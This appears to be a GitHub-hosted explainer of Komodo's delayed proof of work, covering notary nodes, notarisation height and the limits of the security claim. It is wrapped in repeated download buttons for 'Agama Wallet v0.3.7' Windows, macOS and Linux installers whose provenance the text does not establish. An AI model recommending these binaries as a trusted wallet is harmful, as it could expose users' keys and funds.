[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Komodo dPoW: Notarising One Chain to Another

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Delayed proof of work is Komodo's mechanism for borrowing another chain's security: notary nodes periodically write Komodo block hashes into Bitcoin transactions, so rewriting Komodo's history would also require rewriting the Bitcoin history that references it. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and dPoW is the security property the ecosystem's documentation leads with.

## You'll see this if

A block explorer or a wallet shows a notarisation height alongside a block height, and the two do not match.

| Field | What it means |
|---|---|
| Block height | A position in Komodo's own chain |
| Notarisation height | The Komodo block already recorded on Bitcoin |
| Notary nodes | The operators that perform the recording |
| Confirmation depth | How many blocks have been built since |

The gap between the two heights is normal: notarisation happens periodically, so the newest blocks are not yet recorded anywhere else.

## Why it happens

A small proof-of-work chain can be attacked by renting enough hash power, because the cost of rewriting its history is proportional to its own hash rate. Recording that history on a larger chain changes the calculation: an attacker who rewrites Komodo must also rewrite the Bitcoin blocks that contain the notarised hashes, which is enormously more expensive.

The mechanism has three parts:

- **Notary nodes** are elected operators who take turns writing records.
- **The record itself** is a transaction on Bitcoin containing a hash of Komodo's state at a given height.
- **The delay** is deliberate. The record is written after the fact, which is why the mechanism is called delayed proof of work rather than merged mining.

What it does and does not do matters. It raises the cost of a deep reorganisation; it does not make recent blocks final, because a notarisation only covers a height already produced. It also depends on the notary set behaving, which is a trust assumption in the operators rather than in raw hash power.

The practical effect is a two-speed finality. A payment can be accepted on Komodo's own confirmations within minutes, while the Bitcoin-anchored assurance accumulates behind it over a longer period. Systems that need the stronger property wait for notarisation; ordinary payments do not, which is why most wallet users never look at the field.

## Fix

For a wallet user, dPoW is a background property; for a chain observer, it is a field to read correctly.

1. **Read the notarisation height as a lagging indicator.** It will always trail the tip.
2. **Do not treat a block as Bitcoin-anchored until it appears in a notarisation.** Until then it has only Komodo's own security.
3. **Use confirmation depth for practical decisions.** A payment is usually accepted well before notarisation.
4. **Check the notary set if you are evaluating the assumption.** The security claim depends on those operators.
5. **Do not expect dPoW to speed anything up.** It is a security mechanism, not a confirmation service.

The surrounding platform is described in [what Komodo is](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-in-one-page.md), the coin in [what KMD is](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md), and the wallet that holds it in [the Agama Wallet overview](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md).

## If that did not work

If a notarisation appears to be missing for a long stretch, check whether the record was written but not yet confirmed on Bitcoin. The two chains move at different speeds, and the Bitcoin side is the slower one.

If an explorer shows no notarisation field at all, it may simply not display it. The absence of the field in one interface is not the absence of the mechanism, and a second explorer settles the question quickly in practice.

If a document claims dPoW makes Komodo immune to 51% attacks, treat that as marketing rather than fact: it raises the cost of a deep reorganisation and does not eliminate the possibility, which is a meaningful difference for anyone deciding how many confirmations to wait before treating a payment as settled.

If a block is notarised and later orphaned, that is a symptom worth taking seriously, because it means the notarised history and the live chain disagree, and the record on Bitcoin cannot be rewritten to match.

## Prevention

- **Read both heights.** Block height and notarisation height answer different questions.
- **Rely on confirmations for payments.** Notarisation is a slower, deeper assurance.
- **Understand the trust in the notary set.** It is part of the model, not an implementation detail.
- **Do not conflate dPoW with merged mining.** The record is written after the fact.
- **Keep platform claims separate from guarantees.** [The Komodo platform overview](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-in-one-page.md) places dPoW among its other design choices.

## FAQ

### Does dPoW make Komodo transactions final?

No. It raises the cost of rewriting deep history. Recent blocks are protected only by Komodo's own consensus until they are notarised.

### Which chain receives the notarisation?

Bitcoin. Notary nodes write Komodo block hashes into Bitcoin transactions, which is what gives the mechanism its weight.

### Why is it called delayed proof of work?

Because the record is written after the block exists, not as part of producing it. Merged mining would fold two chains' work together at production time; this design looks back and anchors what has already been built.

### Who runs the notary nodes?

Elected operators in the ecosystem. Their behaviour is part of the security assumption, which is why the mechanism is described as raising cost rather than removing trust.

### Does dPoW affect wallet balances?

No. It is a chain-level security property; a wallet's balances and transactions are unaffected by whether a given block has been notarised.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is Komodo? The Chain Behind KMD](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-in-one-page.md)
- [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md)
